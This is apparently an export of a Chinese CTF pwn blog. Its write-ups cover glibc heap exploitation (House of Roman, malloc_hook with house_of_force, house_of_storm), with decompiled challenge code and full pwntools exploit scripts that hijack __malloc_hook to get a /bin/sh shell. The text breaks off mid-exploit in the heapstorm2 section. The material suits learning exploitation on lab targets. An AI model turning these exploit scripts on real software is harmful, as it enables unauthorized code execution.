printf(&quot;Input the note content:&quot;);    v2 = read(0, buf, 0xFFuLL);    if ( v2 &gt; v3 )      v2 = v3;    dest = malloc(v3 + 8);    if ( dest &amp;&amp; v2 )      memcpy(dest, buf, v2 - 1);    while ( dword_202048[4 * v1] )      ++v1;    *((_QWORD *)&amp;unk_202040 + 2 * (int)v1) = dest;    dword_202048[4 * v1] = v3;    ++dword_20203C;    printf(&quot;Here is your label: %d\\n&quot;, v1);    puts(&quot;Done~!&quot;);    return 0LL;  &#125;  else  &#123;    puts(&quot;Not allow~!&quot;);    return 1LL;  &#125;&#125;\nedit没有溢出\n__int64 sub_D43()&#123;  unsigned int v1; // [rsp+8h] [rbp-8h]  printf(&quot;Input the note index:&quot;);  v1 = sub_A80();  if ( v1 &lt; 0x11 &amp;&amp; dword_202048[4 * v1] )  &#123;    printf(&quot;Input the note content:&quot;);    read(0, *((void **)&amp;unk_202040 + 2 * (int)v1), (unsigned int)dword_202048[4 * v1]);    puts(&quot;Done~!&quot;);    return 0LL;  &#125;  else  &#123;    puts(&quot;Not allow~!&quot;);    return 1LL;  &#125;&#125;\nfree存在UAF\n__int64 sub_E1E()&#123;  unsigned int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;Input the note index:&quot;);  v1 = sub_A80();  if ( v1 &lt; 0x11 &amp;&amp; dword_202048[4 * v1] )  &#123;    free(*((void **)&amp;unk_202040 + 2 * (int)v1));    puts(&quot;Done~!&quot;);    return 0LL;  &#125;  else  &#123;    puts(&quot;Not allow~!&quot;);    return 1LL;  &#125;&#125;\nHouse of roman，需要爆破12bits的数据堆风水呜呜呜\nfrom pwn import *import tracebackdef init_note(size, content):    p.sendlineafter(&#x27;Choice:&#x27;, &#x27;1&#x27;)    p.sendlineafter(&#x27;Input the note length:&#x27;, str(size))    p.sendafter(&#x27;Input the note content:&#x27;, content)def edit_note(index, size, content):    p.sendlineafter(&#x27;Choice:&#x27;, &#x27;2&#x27;)    p.sendlineafter(&#x27;Input the note index:&#x27;, str(index))    p.sendafter(&#x27;Input the note content:&#x27;, content)def free_note(index):    p.sendlineafter(&#x27;Choice:&#x27;, &#x27;3&#x27;)    p.sendlineafter(&#x27;Input the note index:&#x27;, str(index))with context.quiet:    try_count = 0    # since we are replacing some addresses partially, and ASLR is enabled    # we are executing the program over and over again until we get lucky    while True:        try:            try_count += 1            print (sys.stderr, &#x27;Try #&#123;&#125;&#x27;.format(try_count))            #p = process(&#x27;./program&#x27;, env = &#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.23.so&#x27;&#125;)            p = remote(&quot;192.168.63.133&quot;, 10001)            # chunk#0 (0x81)            init_note(0x68, &#x27;a&#x27; * 255)            # chunk#1 (0x81)            init_note(0x68, &#x27;b&#x27; * 255)            # chunk#2 (0x91)            init_note(0x78, &#x27;c&#x27; * 255)            # chunk#3 (0x71)            init_note(0x60, &#x27;d&#x27; * 255)            # chunk#4 (0x71)            init_note(0x60, &#x27;e&#x27; * 255)            # launch double free attack            # fastbin free list (0x80): chunk#0 --&gt; chunk#1 --&gt; chunk#0            free_note(0)            free_note(1)            free_note(0)            # chunk#5 (0x81)            # this chunk is co-located with chunk#0, so we partially overwrite the fd pointer            init_note(0x68, p8(0xe0) + b&#x27;\\n&#x27;)            # chunk#6 (0x81)            # this chunk is co-located with chunk#1            init_note(0x68, b&#x27;b&#x27; * 0x50 + p64(0) + p64(0x81) + p64(0))            # chunk#7 (0x81)            # this chunk is co-located with chunk#0, so we partially overwrite the fd pointer            # after this allocation will put a heap address in fastbin free list            init_note(0x68, b&#x27;a&#x27; * 255)            # freeing chunk#2 will put it in the unsorted bin and set the fd/bk pointers with libc address            free_note(2)            # chunk#8 (0x81)            # this chunk is a fake chunk which is located a little before chunk#2            # basically, we overwrite chunk#2&#x27;s size and partially its fd which is pointing to somewhere before malloc_hook            # the first 12 bits is fixed, but the next 4 bits have to be 1            init_note(0x68, b&#x27;b&#x27; * 0x10 + p64(0) + p64(0x71) + p16(0x1aed) + b&#x27;\\n&#x27;)            # launch double free attack            # fastbin free list (0x70): chunk#4 --&gt; chunk#3 --&gt; chunk#4            free_note(4)            free_note(3)            free_note(4)            # chunk#9 (0x71)            # this chunk is co-located with chunk#4, so we partially overwrite the fd pointer to somewhere before malloc_hook            init_note(0x60, p8(0x00) + b&#x27;\\n&#x27;)            # chunk#10 (0x71)            # this chunk is co-located with chunk#3            init_note(0x60, b&#x27;d&#x27; * 255)            # chunk#11 (0x71)            # this chunk is co-located with chunk#4            # after this allocation, address of chunk#2 will be put in the fastbin free list            init_note(0x60, b&#x27;f&#x27; * 255)            # chunk#12 (0x71)            # this chunk is co-located with chunk#2            # after this allocation, the address before malloc_hook will be put in the fastbin free list            init_note(0x60, b&#x27;\\n&#x27;)            # chunk#13 (0x7f)            # this chunk is located before __malloc_hook            init_note(0x60, b&#x27;\\n&#x27;)            # fix unsorted bin chunk#2 size to look like a non-fastbin chunk            # also overwrite bk pointer of chunk#2 which points to 16 bytes before __malloc_hook            # preparing for unsorted_bin_attack            edit_note(8, 0x29, b&#x27;b&#x27; * 0x10 + p64(0) + p64(0x91) + p64(0) + p8(0x00))            # chunk#14 (0x91)            # allocate a chunk from unsorted bin, so the __malloc_hook will be overwritten with a libc address            init_note(0x78, b&#x27;\\n&#x27;)            &#x27;&#x27;&#x27;            0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)            constraints:                [rsp+0x30] == NULL            &#x27;&#x27;&#x27;            # overwrite __malloc_hook partially to point to the one gadget            # the first 12 bits is fixed, but the next 12 bits have to be a52            edit_note(13, 0x13 + 3, b&#x27;\\x00&#x27; * 0x13 + p32(0xa5226a)[0:3])            # chunk#15            # trigger __malloc_hook            init_note(0x100, b&#x27;\\n&#x27;)            p.clean()            p.sendline(b&#x27;ls&#x27;)            p.recv(0)            p.interactive()            break        except EOFError:            p.close()        except:            print ( sys.stderr, traceback.format_exc())            break","categories":["heap"],"tags":["bin"]},{"title":"malloc_hook","url":"/2023/09/07/malloc-hook/","content":"glibc2.30后增加了对malloc的检查，malloc_hook手法已经不可用直接上例题gyctf_2020_forcechecksec\n[*] &#x27;/var/run/vmblock-fuse/blockdir/Zf5bfF/force&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n看看add函数\nunsigned __int64 sub_A20()&#123;  const void **i; // [rsp+0h] [rbp-120h]  __int64 size; // [rsp+8h] [rbp-118h]  char s[256]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  memset(s, 255, sizeof(s));  for ( i = (const void **)&amp;unk_202080; *i; ++i )    ;  if ( (char *)i - (char *)&amp;unk_202080 &gt; 39 )    exit(0);  puts(&quot;size&quot;);  read(0, nptr, 0xFuLL);  size = atol(nptr);  *i = malloc(size);   //没有限制chunk_size  if ( !*i )    exit(0);  printf(&quot;bin addr %p\\n&quot;, *i);//会打印堆地址  puts(&quot;content&quot;);  read(0, (void *)*i, 0x50uLL);//存在堆溢出，当申请的chunk_size &lt; 0x50时  puts(&quot;done&quot;);  return __readfsqword(0x28u) ^ v4;&#125;\none_gadgets\n0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\n先打house_of_force，拿捏top_chunk同时，在分配第一个chunk时，程序还会打印出bin_addr,可以利用此泄露libc_addr\n__realloc_hook 和 __malloc_hook这两个钩子函数是相邻的，我们可以利用同一个chunk来劫持__malloc_hook为realloc+0x10，并劫持__realloc_hook为one_gadget\n再次执行malloc即可getshell\nfrom pwn import *#p = process(&#x27;./force&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,27065)libc = ELF(&quot;buu_libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size, content):    p.recvuntil(&quot;2:puts\\n&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;size\\n&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;bin addr &quot;)    info = p.recvuntil(&quot;\\n&quot;, drop=True)    # print(info)    info = int(info.decode(&quot;ISO-8859-1&quot;), 16)    p.recvuntil(&quot;content\\n&quot;)    p.send(content)    return infoone_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]libc.address = add(0x200000, &#x27;chunk0\\n&#x27;) + 0x200ff0 #gdb找偏移，leak_libc_base &amp;&amp; house_of_force拿捏topchunksuccess(&#x27;libc_base&#x27;+hex(libc.address))heap_addr = add(0x18,b&#x27;a&#x27;*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF)) #leak_heap_addr &amp;&amp;修改topchunk的size为0xFFFFFFFFFFFFFFFFsuccess(&quot;heap_addr:&quot;+hex(heap_addr))top = heap_addr + 0x10          #leak_topchunk_addrmalloc_hook = libc.sym[&#x27;__malloc_hook&#x27;] #get_malloc_hook_addrsuccess(&quot;malloc_hook:&quot;+hex(malloc_hook))realloc = libc.sym[&quot;__libc_realloc&quot;]offset = malloc_hook - topsystem = libc.sym[&#x27;system&#x27;]bin_sh = libc.search(b&#x27;/bin/sh&#x27;)success(&quot;system:&quot; + hex(system))success(&quot;bin_sh:&quot; + str(bin_sh))#debug()#one_gadget + libc.address -&gt; 计算偏移,使topchunk落在malloc_hook处#此时申请一个chunk，就可以实现修改malloc_hook和realloc_hookadd(offset-0x30,b&#x27;aaa\\n&#x27;)add(0x30,b&#x27;a&#x27;*8+p64(one_gadget[1] + libc.address)+p64(realloc+0x10))#hijack_malloc_hook#再次执行malloc，即可getshellp.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&#x27;1&#x27;)p.recvuntil(&quot;size\\n&quot;)p.sendline(str(20))p.interactive()","categories":["heap"],"tags":["hook"]},{"title":"house_of_storm","url":"/2023/10/13/house-of-storm/","content":"I’m the storm that is approching\n从https://www.cnblogs.com/Rookle/p/13140339.html来的关键源码+注释orz\n//#define unsorted_chunks(M)          (bin_at (M, 1))//如果unsorted bins不为空，从尾到头遍历unsorted bin中的每个chunkwhile ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;    bck = victim-&gt;bk;//取出unsorted的尾部的chunk    /*        检查当前遍历的 chunk 是否合法，chunk 的大小不能小于等于 2 * SIZE_SZ，        也不能超过 该分配区总的内存分配量。然后获取 chunk 的大小并赋值给 size。        这里的检查似乎有点小问题，直接使用了 victim-&gt;size，但 victim-&gt;size         中包含了相关的标志位信息，使用 chunksize(victim) 才比较合理，但在         unsorted bin 中的空闲 chunk 的所有标志位都清零了，所以这里直接         victim-&gt;size 没有问题。    */    if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0)        || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))        malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,                        chunk2mem(victim), av);    size = chunksize(victim);//获取victim的size\t/*        如果要申请的大小在smallbin范围 且 unsorted chunks 只有一个chunk，且        victim是last_remainder 且 victim的size大于请求的chunk的大小nb加上        (MINSIZE)最小chunk的size,那么就切割remainder,然后返回victim。                last_remainder 是一个 chunk 指针，分配区上次分配 small chunk 时，        从一个 chunk 中分 裂出一个 small chunk 返回给用户，分裂后的剩余部分        形成一个 chunk，last_remainder 就是 指向的这个 chunk。    */    if (in_smallbin_range(nb) &amp;&amp;        bck == unsorted_chunks(av) &amp;&amp;        victim == av-&gt;last_remainder &amp;&amp;        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;        //分割remainder        remainder_size = size - nb;//计算分割后剩下的size        remainder = chunk_at_offset(victim, nb);//获取remainder的地址        //把remainder加入unsorted bin中        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;        av-&gt;last_remainder = remainder; // 设置last_remainder为remainder        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);        //如果是remainder在large bin的范围，则把fd_nextsize,fd_nextsize清零        if (!in_smallbin_range(remainder_size)) &#123;            remainder-&gt;fd_nextsize = NULL;            remainder-&gt;fd_nextsize = NULL;        &#125;\t\t//设置victim的size        set_head(victim, nb | PREV_INUSE |                 (av != &amp;main_arena ? NON_MAIN_ARENA : 0));        //设置remainder的size        set_head(remainder, remainder_size | PREV_INUSE);        //设置remainder的物理相邻的下一个chunk的prev_size        set_foot(remainder, remainder_size);        check_malloced_chunk(av, victim, nb);//默认不做任何操作        void *p = chunk2mem(victim);//将chunk指针转化为mem指针        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做        return p;    &#125;    //把victim从unsorted bin 中移除    unsorted_chunks(av)-&gt;bk = bck;    bck-&gt;fd = unsorted_chunks(av);    //如果 victim 的size 与申请的size相等，那么就返回其。    if (size == nb) &#123;        //设置victim物理相邻的下一个chunk的prev_inuse位        set_inuse_bit_at_offset(victim, size);        //如果av不是main_arena 也就是说如果不是主进程,设置NON_MAIN_ARENA位        if (av != &amp;main_arena)            victim-&gt;size |= NON_MAIN_ARENA;         check_malloced_chunk(av, victim, nb); // 默认不做任何操作        void *p = chunk2mem(victim);//把chunk转换为mem指针        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做        return p;    &#125;      //如果上一步取出的chunk没有匹配成功，那么将该chunk放入对应的bin中    //如果在smallbin的范围,则放到对应多small bin中    if (in_smallbin_range(size))     &#123;        victim_index = smallbin_index(size);//获取size对应的smallbin的index        bck = bin_at(av, victim_index);//bck指向size对应的smallbin的链表头        //fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)        fwd = bck-&gt;fd;    &#125;    else//如果不再smallbin的范围，也就是说在large bin 的范围    &#123;        victim_index = largebin_index(size);//获取size对应的large bin的index        bck = bin_at(av, victim_index);//bck指向size对应的large bin的链表头        fwd = bck-&gt;fd;//fwd指向size对应的large bin的链表中的新加入的chunk                //如果large bin 非空，在largbin进行按顺序插入        if (fwd != bck) &#123;            /* Or with inuse bit to speed comparisons */            size |= PREV_INUSE;            assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert            /*            \tlarge bin中的chunk是按从大到小排列的，如果size &lt; large bin             \t的最后一个chunk，说明size是这个large bin中的最小的，我们把它            \t加入到此large bin尾部。            */            if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123;                                fwd = bck;                bck = bck-&gt;bk;                                /*                large bin 中size最小的chunk的fd_nextsize会指向size最大的                那个chunk，也就是首部的chunk。同样，large bin 中size最大的                chunk的bk_nextsize会指向size最小的那个chunk。                victim的bk_nextsize指向large bin原来最小的chunk，它的                bk_nextsize指向最大的那个chunk。那么原来的最小的就成了第二小的了。                把它fd_nextsize和bk_nextsize都修正。                */                victim-&gt;fd_nextsize = fwd-&gt;fd;                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;                //最大size的chunk的bk_nextsize，和原来最小chunk的bk_nextsize都指向victim                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;            &#125;             else //如果victim不是large bin 中最小的chunk            &#123;                assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert                //从大到小（从头到尾）找到合适的位置                while ((unsigned long) size &lt; fwd-&gt;size) &#123;                    fwd = fwd-&gt;fd_nextsize;                    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                &#125;\t\t\t\t//如果size刚好相等，就直接加入到其后面省的改fd_nextsize和bk_nextsize了                if ((unsigned long) size == (unsigned long) fwd-&gt;size)                    fwd = fwd-&gt;fd;                else                 &#123;                    //size不相等，即size&gt;fwd-&gt;size，把victim加入到纵向链表中                    victim-&gt;fd_nextsize = fwd;                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                    fwd-&gt;bk_nextsize = victim;                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                &#125;                bck = fwd-&gt;bk;            &#125;        &#125;         else //如果large bin 为空，将victim加入到纵向列表        \tvictim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;    &#125;    //#define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))    mark_bin(av, victim_index); //把victim加入到的bin的表示为非空    //把victim加入到large bin的链表中    victim-&gt;bk = bck;    victim-&gt;fd = fwd;    fwd-&gt;bk = victim;    bck-&gt;fd = victim;&#125;\n在这里用how2heap里glibc2.27的例子来看实现跟glibc2.23不一样的是，随着tcache机制的加入在2.27打storm需要先把tcachebin填满我删除了大部分的英文但保留了部分这样才知道打的是pwn(doge)\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char filler[0x60];char target[0x60]; void init()&#123;        setvbuf(stdout, NULL, _IONBF, 0);        setvbuf(stdin, NULL, _IONBF, 0);        // clearenv();&#125;int get_shift_amount(char* pointer)&#123;\t\tint shift_amount = 0;\tlong long ptr = (long long)pointer;\t\t\twhile(ptr &gt; 0x20)&#123;\t\tptr = ptr &gt;&gt; 8; \t\tshift_amount += 1; \t&#125;\t\treturn shift_amount - 1; // Want amount PRIOR to this being zeroed out&#125;int main()&#123;\tinit();    char *unsorted_bin, *large_bin, *fake_chunk, *ptr;\tint* tcaches[7];\tunsorted_bin = malloc ( 0x4e8 );  // size 0x4f0 \t// prevent merging \tmalloc ( 0x18 ); \tint shift_amount = get_shift_amount(unsorted_bin);\t\tprintf(&quot;Shift Amount: %d\\n&quot;, shift_amount); \tsize_t alloc_size = ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);\tif(alloc_size &lt; 0x10)&#123;\t\tprintf(&quot;Chunk Size: 0x%lx\\n&quot;, alloc_size);\t\tputs(&quot;Chunk size is too small&quot;);\t\texit(1);\t&#125;\talloc_size = (alloc_size &amp; 0xFFFFFFFFE) - 0x10; // Remove the size bits\tprintf(&quot;In this case, the chunk size is 0x%lx\\n&quot;, alloc_size);        // Checks to see if the program will crash or not        if((alloc_size &amp; 0x8) != 0 || (((alloc_size &amp; 0x4) == 0x4) &amp;&amp; ((alloc_size &amp; 0x2) != 0x2)))&#123;                puts(&quot;Please try again! :)&quot;);                                return 1;        &#125;//这里crash好多次 :(\tif(alloc_size &lt; 0x410)&#123;\t\t// Fill up the TCache for the proper size\t\tfor(int i = 0; i &lt; 7; i++)&#123;\t\t\ttcaches[i] = malloc(alloc_size);\t\t&#125;\t\tfor(int i = 0; i &lt; 7; i++)&#123;\t\t\tfree(tcaches[i]);\t\t&#125;\t&#125;\telse&#123;\t\tputs(&quot;Not filling up the TCache&quot;);\t&#125;\tlarge_bin  =  malloc ( 0x4d8 );  // size 0x4e0 \t// prevent merging \tmalloc ( 0x18 );\t// FIFO \tfree ( large_bin );  // put small chunks first \tfree ( unsorted_bin );\t// Put the &#x27;large bin&#x27; chunk into the large bin\tunsorted_bin = malloc(0x4e8);\tfree(unsorted_bin);\t// The address that we want to write to!\tfake_chunk = target - 0x10;\t\t((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin-&gt;bk\t// Only needs to be a valid address. \t(( size_t *) large_bin )[1]  =  (size_t)fake_chunk  +  8 ;  // large_bin-&gt;fd\t(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // large_bin-&gt;bk_nextsize\tprintf(&quot;String before: %s\\n&quot;, target);\tprintf(&quot;String pointer: %p\\n&quot;, target);\tptr = calloc(alloc_size, 1);\tstrncpy(ptr, &quot;\\x41\\x42\\x43\\x44\\x45\\x46\\x47&quot;, 0x58 - 1);\t\tprintf(&quot;String after %s\\n&quot;, target);\tprintf(&quot;Fake chunk ptr: %p\\n&quot;, ptr);\treturn 0;&#125;\n\n不知道为什么在gdb里一直crash，但是直接运行可以成功 :)没法调试放个完整的运行结果\nHouse of Storm======================================Preparing chunks for the exploitPut one chunk into unsorted bin and the other into the large binThe unsorted bin chunk MUST be larger than the large bin chunk.Find the proper chunk size to allocate.Must be exactly the size of the written chunk from above.Shift Amount: 5In this case, the chunk size is 0x46Fill TCache of the allocation size amount if the size of the target chunk is a TCache size chunk (0x20-0x410)Done to prevent usage of TCache stashingVulnerability! Overwrite unsorted bins &#x27;bk&#x27; pointer with our target location. This is our target location to get from the allocatorLater on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the locationof your fake chunk.Misalign the location in order to use the primitive as a SIZE value.The &#x27;offset&#x27; changes depending on if the binary is PIE (5) or not PIE (2).Vulnerability #2!Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.Make allocation of the size that the value will be written for.Once the allocation happens, the madness beginsOnce in the unsorted bin, the &#x27;large bin&#x27; chunk will be used in orer to write a fake &#x27;size&#x27; value to the location of our target.After this, the target will have a valid size.Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a validsize and remove it from the bin.With this, we have pulled out an arbitrary chunk!String before: String pointer: 0x56053bf12040Make a call to &#x27;calloc&#x27; instead of &#x27;malloc&#x27; in order to not use the TCache on the allocation. Had to fill TCachebecause stashing would prevent the exploit from workingString after ABCDEFGFake chunk ptr: 0x56053bf12040\n\n来看道例题吧据说就是该攻击手法的来源0ctf_2018_heapstorm2glibc2.23checksec\n└─$ checksec 0ctf_2018_heapstorm2[*] &#x27;/Desktop/0ctf_2018_heapstorm2&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n‘start’\nif ( !mallopt(1, 0) )    exit(-1);        //ban掉了fastbin  if ( mmap((void *)0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != (void *)322371584 )//在0x13370000分配一段0x1000的内存    exit(-1);  fd = open(&quot;/dev/urandom&quot;, 0);  if ( fd &lt; 0 )    exit(-1);  if ( read(fd, (void *)0x13370800, 0x18uLL) != 24 )//向0x13370800读入24字节的随机数    exit(-1);  close(fd);  MEMORY[0x13370818] = MEMORY[0x13370810];\n读入了3个随机数，第4个和第3个一样，我们记作r1,r2,r3,r4初始化后面的地址，用r1异或0 作为ptr的值，r2异或0作为size值，我们之后的ptr都是通过xor r1得到的，size都是 xor r2得到的\npwndbg&gt; x /40gx 0x133708000x13370800:    0x72cec7f9b44fb49e  0x438137bc554b405e0x13370810:    0x7a4f542a3248dba2  0x00000000000000000x13370820:    0x0000000000000000  0x00000000000000000x13370830:    0x0000000000000000  0x00000000000000000x13370840:    0x0000000000000000  0x00000000000000000x13370850:    0x0000000000000000  0x0000000000000000\n\n1.Allocate注意xor\nvoid __fastcall sub_DE6(_QWORD *a1)&#123;  __int64 v1; // rsi  int i; // [rsp+10h] [rbp-10h]  int v3; // [rsp+14h] [rbp-Ch]  void *v4; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  &#123;    v1 = a1[2 * i + 5];    if ( !sub_BCC(a1, v1) )    &#123;      printf(&quot;Size: &quot;);      v3 = sub_1551(&quot;Size: &quot;, v1);      if ( v3 &gt; 12 &amp;&amp; v3 &lt;= 4096 )      &#123;        v4 = calloc(v3, 1uLL);        if ( !v4 )          exit(-1);        a1[2 * i + 5] = sub_BCC(a1, v3); //a1[i+2].m_size = a1[0].m_size ^ input_size        a1[2 * i + 4] = sub_BB0(a1, (__int64)v4);//a1[i+2].m_heap = a1[0].m_heap ^ heap_addr        printf(&quot;Chunk %d Allocated\\n&quot;, (unsigned int)i);      &#125;      else      &#123;        puts(&quot;Invalid Size&quot;);      &#125;      return;    &#125;  &#125;&#125;\n2.Update\nint __fastcall sub_F21(_QWORD *a1, __int64 a2)&#123;  __int64 v2; // rsi  signed int v4; // [rsp+10h] [rbp-20h]  int v5; // [rsp+14h] [rbp-1Ch]  __int64 v6; // [rsp+18h] [rbp-18h]  printf(&quot;Index: &quot;);  v4 = sub_1551(&quot;Index: &quot;, a2);  if ( (unsigned int)v4 &gt; 0xF )    return puts(&quot;Invalid Index&quot;);  v2 = a1[2 * v4 + 5];  if ( !sub_BCC(a1, v2) )    return puts(&quot;Invalid Index&quot;);  printf(&quot;Size: &quot;);  v5 = sub_1551(&quot;Size: &quot;, v2);  if ( v5 &lt;= 0 || v5 &gt; (unsigned __int64)(sub_BCC(a1, a1[2 * v4 + 5]) - 12) )// 0&lt;v5&lt;=size -12    return puts(&quot;Invalid Size&quot;);  printf(&quot;Content: &quot;);  v6 = sub_BB0(a1, a1[2 * v4 + 4]);  sub_1377(v6, v5);//off-by-null  strcpy((char *)(v5 + v6), &quot;HEAPSTORM_II&quot;);  return printf(&quot;Chunk %d Updated\\n&quot;, (unsigned int)v4);&#125;\n3.Delete\nint __fastcall sub_109B(_QWORD *a1, __int64 a2)&#123;  void *v3; // rax  signed int v4; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  v4 = sub_1551(&quot;Index: &quot;, a2);  if ( (unsigned int)v4 &gt; 0xF || !sub_BCC(a1, a1[2 * v4 + 5]) )    return puts(&quot;Invalid Index&quot;);  v3 = (void *)sub_BB0(a1, a1[2 * v4 + 4]);  free(v3);  a1[2 * v4 + 4] = sub_BB0(a1, 0LL);//ptr  a1[2 * v4 + 5] = sub_BCC(a1, 0LL);//size这俩都只是被xor了，没清零  return printf(&quot;Chunk %d Deleted\\n&quot;, (unsigned int)v4);&#125;\n4.View\nint __fastcall sub_11B5(_QWORD *a1, __int64 a2)&#123;  __int64 v3; // rbx  __int64 v4; // rax  signed int v5; // [rsp+1Ch] [rbp-14h]  if ( (a1[3] ^ a1[2]) != 322401073LL )//要满足r2 xor r3 = 0x13377331才可以view    return puts(&quot;Permission denied&quot;);  printf(&quot;Index: &quot;);  v5 = sub_1551(&quot;Index: &quot;, a2);  if ( (unsigned int)v5 &gt; 0xF || !sub_BCC(a1, a1[2 * v5 + 5]) )    return puts(&quot;Invalid Index&quot;);  printf(&quot;Chunk[%d]: &quot;, (unsigned int)v5);  v3 = sub_BCC(a1, a1[2 * v5 + 5]);  v4 = sub_BB0(a1, a1[2 * v5 + 4]);  sub_14D4(v4, v3);  return puts(byte_180A);&#125;\n回顾一下house of storm的条件glibc版本小于2.30This requires the following:Write on free unsorted bin chunkWrite on free large bin chunkKnown address of target memory addressKnown address of upper bits of heap chunk\n程序可能crash多跑几次\nfrom pwn import *from pwn import p32,p64,u32,u64context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,25201)#p = process(&#x27;./0ctf_2018_heapstorm2&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)def add(size):    p.sendlineafter(b&#x27;Command: &#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;Size: &#x27;,str(size))def edit(idx,content):    p.sendlineafter(b&#x27;Command: &#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;,str(idx))    p.sendlineafter(b&#x27;Size: &#x27;,str(len(content)))    p.recvuntil(b&#x27;Content: &#x27;)    p.send(content)def delete(idx):    p.recvuntil(&#x27;Command: &#x27;)    p.sendline(&#x27;3&#x27;)    p.recvuntil(&#x27;Index: &#x27;)    p.sendline(&#x27;%d&#x27; % idx)def show(idx):    p.sendlineafter(b&#x27;Command: &#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;,str(idx))#---------------堆风水，启动！-------------------------#add(0x18)#chunk0\t  off_by_null修改1的sizeadd(0x508)#chunk1add(0x18)#chunk2#---------------add(0x18)#chunk3   off_by_null修改4的sizeadd(0x508)#chunk4add(0x18)#chunk5   #---------------add(0x18)#chunk6   防止合并到top_chunk#----------------unsorted chunk-----------------------#edit(1,b&#x27;\\x00&#x27;*0x4F0 + p64(0x500)) #fake_chunkdelete(1)edit(0,b&#x27;\\x00&#x27;*(0x18-12)) #修改chunk1的size， 0x511-&gt;0x500add(0x18) #chunk1 add(0x4d8) #chunk7    把0x500用完delete(1)   delete(2) #chunk1-chunk2 合并   这是就存在堆重叠add(0x38)#chunk1add(0x4e8)#chunk2   chunk7的content指向chunk2的chunk-0x10位置处,我们可以实现控制unsorted chunk#-------------------large chunk-----------------------------------#edit(4,b&#x27;\\x00&#x27;*0x4F0+p64(0x500))#fake_chunkdelete(4)edit(3,b&#x27;\\x00&#x27;*(0x18-12)) #修改chunk4的size， 0x511-&gt;0x500add(0x18) #chunk4add(0x4d8) #chunk8   把0x500用完delete(4)delete(5) #chunk4-chunk5 合并 这是就存在堆重叠add(0x48)#chunk4  此时unsorted bin中剩下一个0x4e1大小的chunk，且与chunk8重叠，我们可以实现控制large chunk#---------------unsorted chunk 和 large chunk ----------------------#delete(2)add(0x4e8) #把0x4e1的chunk放入到largebin中delete(2)  #把0x4F1的chunk放入到unsorted bin中#---------------storm approching------------------------------#fake_chunk = 0x13370800 - 0x20payload = b&#x27;\\x00&#x27; * 0x10 payload += p64(0) payload += p64(0x4f1) payload += p64(0) payload += p64(fake_chunk)edit(7, payload) #修改unsorted chunk的bkpayload = b&#x27;\\x00&#x27; * 0x20 payload += p64(0) payload += p64(0x4e1) payload += p64(0) payload += p64(fake_chunk+8) payload += p64(0) payload += p64(fake_chunk-0x18-5)edit(8, payload) #修改 large chunk 的 bk 和 bk_nextsizeadd(0x48)  #chunk2  -&gt; 0x133707e0   成功将申请到了heaparray附近#-----------------------泄漏 